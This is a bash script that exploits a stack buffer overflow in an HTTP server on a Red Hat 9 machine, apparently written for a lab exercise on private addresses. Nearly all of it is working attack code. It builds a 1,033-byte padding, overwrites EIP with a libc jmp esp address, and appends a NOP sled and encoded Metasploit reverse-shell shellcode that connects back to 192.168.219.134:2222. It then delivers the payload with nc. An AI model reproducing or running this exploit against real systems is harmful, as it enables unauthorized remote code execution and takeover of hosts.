#!/bin/bash

# This is the exploit for the RedHat 9 machine. The address of a jmp esp instruction was found in libc and 
# located at 0x42122ba7.

# The offset was determined by submitting a msf pattern of length
# 1,500 to the server. This crashed the program, and analysis 
# of the core file showed that the offset was 1033 bytes. Thus, with a 
# payload of 1,037 bytes the EIP is covered by the last 4 bytes. We then generate a 
# payload that overwrites the EIP with the address to a jmp esp instruction. In this code,
# '\x90' is used to cover the offset, though this can be any 1,033 byte sequence. A NOP sled is placed 
# immediately after the EIP, so when jmp esp is executed, the NOPs at 
# the top of the stack will be executed, reaching the shellcode and 
# generating the reverse shell.
BUFFER=`perl -e "print '\x90'x1033"`
ADDR=`perl -e "print '\xa7\x2b\x12\x42'"`
NOP=`perl -e "print '\x90'x100"`

# linux/x86/shell_reverse_tcp - 197 bytes
# https://metasploit.com/
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=192.168.219.134, LPORT=2222,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5, PrependFork=false,
# PrependSetresuid=false, PrependSetreuid=false,
# PrependSetuid=false, PrependSetresgid=false,
# PrependSetregid=false, PrependSetgid=false,
# PrependChrootBreak=false, AppendExit=false,
# AutoVerifySession=true, CMD=/bin/sh
SHC="\x89\xe7\xdb\xc0\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x45\x61\x69\x4b\x68\x77\x38\x63\x72\x73\x47\x33\x33\x63\x42\x4a\x75\x52\x6c\x49\x38\x61\x58\x30\x75\x36\x5a\x6d\x6b\x30\x6f\x63\x33\x69\x58\x30\x77\x4f\x78\x4d\x4f\x70\x77\x39\x51\x69\x68\x79\x35\x38\x4f\x30\x4e\x48\x69\x4b\x6d\x56\x32\x48\x67\x72\x55\x50\x73\x38\x4e\x4e\x6c\x49\x78\x61\x6c\x70\x71\x76\x56\x30\x36\x31\x70\x53\x48\x33\x46\x63\x6b\x39\x68\x61\x38\x4d\x4b\x30\x62\x72\x52\x48\x62\x4e\x64\x6f\x64\x33\x31\x78\x62\x48\x46\x4f\x56\x4f\x75\x32\x32\x49\x4d\x59\x6a\x43\x51\x42\x56\x33\x4d\x59\x58\x61\x48\x30\x74\x4b\x7a\x6d\x4b\x30\x41\x41"

# Generate the payload to send to the server. This is composed by concatenating the buffer (1,033 bytes),
# the address of jmp esp that overwrites the EIP, a NOP sled, and the shellcode
PAYLOAD=$BUFFER$ADDR$NOP$SHC
PAYLOAD=$(echo -e $PAYLOAD)

# Send the payload to the server. If we are listening on port 2222 we will receive a shell. 
echo "GET $PAYLOAD HTTP/1.0" | nc 192.168.219.133 8888
